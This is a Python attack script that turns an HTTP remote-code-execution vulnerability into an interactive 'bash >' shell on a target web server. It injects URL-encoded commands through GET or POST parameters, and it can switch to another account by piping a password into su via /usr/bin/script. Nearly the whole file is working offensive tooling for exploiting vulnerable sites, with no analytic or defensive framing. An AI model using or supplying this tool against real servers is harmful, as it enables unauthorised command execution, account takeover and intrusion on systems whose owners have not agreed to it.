#!/usr/bin/env python3
import requests
import cmd
import argparse
import urllib.parse #url-encoding
import re 
import json

def get_args():
    parser = argparse.ArgumentParser(description="""Run shell commands through HTTP RCE as another user than www-data (reverse/bind shell alternative). You MUST put MY_RCE_CMD where the RCE is executed (e.g. --url 'http://victim.com/page.php?cmd=MY_RCE_CMD&foo=bar', --data '{"cmd": "MY_RCE_CMD", "foo": "bar"}'""")
    parser.add_argument('--url', type=str, required=True, help="Target's URL vulnerable to RCE")
    parser.add_argument('--http-method', type=str, required=True, help="HTTP method to use (GET/POST)")
    parser.add_argument('--headers', type=json.loads, required=False, help="""Sets one or more HTTP headers (e.g. --headers '{"Host": "127.0.0.1", "Cookie": "foo=bar"}')""")
    parser.add_argument('--data', type=json.loads, required=False, help="""Sets the requests' parameters. Might be required for POST requests (e.g. --data '{"cmd": "MY_RCE_CMD", "foo": "bar"}')""")
    parser.add_argument('--username', type=str, default='www-data', required=False, help="username (default=www-data)")
    parser.add_argument('--password', type=str, required=False, help='password')
    parser.add_argument('--regex', type=str, required=False, help="Regex pattern to grep match in the response (e.g. --regex 'Password: (.*), plz dont share it', which returns the password only)")
    parser.add_argument('--proxy', type=str, required=False, help="Sets an HTTP proxy (e.g. '127.0.0.1:8080')")
    return parser.parse_args()

def cmdOutput(my_cmd):
    if (username != "www-data" and not password):
        print("[-] You must give a password")
        print("[-] Exiting...")
        exit()

    else:
        if (username != "www-data"):
            # To run a command as another user: su <USER> -c "<COMMAND>". 
            # Then the password is asked. A one-liner trick will be used.
            # "/usr/bin/script" spawns a TTY shell, so "su" is able to run.
            my_cmd = f"""/usr/bin/script -qc 'su {username} -c "{my_cmd}"'"""

            # Sleep is used for su to read the password: 
            # https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal
            my_cmd = f"""sh -c "sleep 0.05; echo {password}" |{my_cmd}"""
            
            # Getting rid of 'Password: ' prompt
            my_cmd = f"{my_cmd} |tail -n +2"
            
        # The command is URL encoded
        encoded_cmd = urllib.parse.quote(my_cmd)
        
        #import pdb; pdb.set_trace()

        if (http_method.upper() == "GET"):
            if proxy:
                if headers:
                    req = requests.get(url.replace("MY_RCE_CMD", encoded_cmd), proxies={'http':f'http://{proxy}'}, headers=headers, verify=False, timeout=10)
                else:
                    req = requests.get(url.replace("MY_RCE_CMD", encoded_cmd), proxies={'http':f'http://{proxy}'}, verify=False, timeout=10)
            else:
                if headers:
                    req = requests.get(url.replace("MY_RCE_CMD", encoded_cmd), headers=headers, verify=False, timeout=10)
                else:
                    req = requests.get(url.replace("MY_RCE_CMD", encoded_cmd), verify=False, timeout=10)
            if regex:
                try:
                    print(re.findall(rf'{regex}', req.text, re.DOTALL)[0])
                except:
                    pass
            else:
                print(req.text)

        elif (http_method.upper() == "POST"):
            data_tmp = data.copy()
            for item in data_tmp:
                data_tmp[item] = data_tmp[item].replace("MY_RCE_CMD", encoded_cmd)

            if proxy:
                if headers:
                    req = requests.post(url, data=data_tmp, headers=headers, proxies={'http':f'http://{proxy}'}, verify=False, timeout=10)
                else:
                    req = requests.post(url, data=data_tmp, proxies={'http':f'http://{proxy}'}, verify=False, timeout=10)
            else:
                if headers:
                    req = requests.post(url, data=data_tmp, headers=headers, verify=False, timeout=10)
                else:
                    req = requests.post(url, data=data_tmp, verify=False, timeout=10)
            if regex:
                try:
                    print(re.findall(rf'{regex}', req.text, re.DOTALL)[0])
                except:
                    pass
            else:
                print(req.text)

        else:
            print("[-] HTTP method not supported.")
            print("[-] Exiting...")
            exit()


# https://www.youtube.com/watch?v=5axsDhumfhU&t=1065s
class RemoteShell(cmd.Cmd):
    prompt = "bash > "
    def default(self, args):
        cmdOutput(args)


args = get_args()
url = args.url
http_method = args.http_method
data = args.data
username = args.username
password = args.password
regex = args.regex
proxy = args.proxy
headers = args.headers
    
RemoteShell().cmdloop()

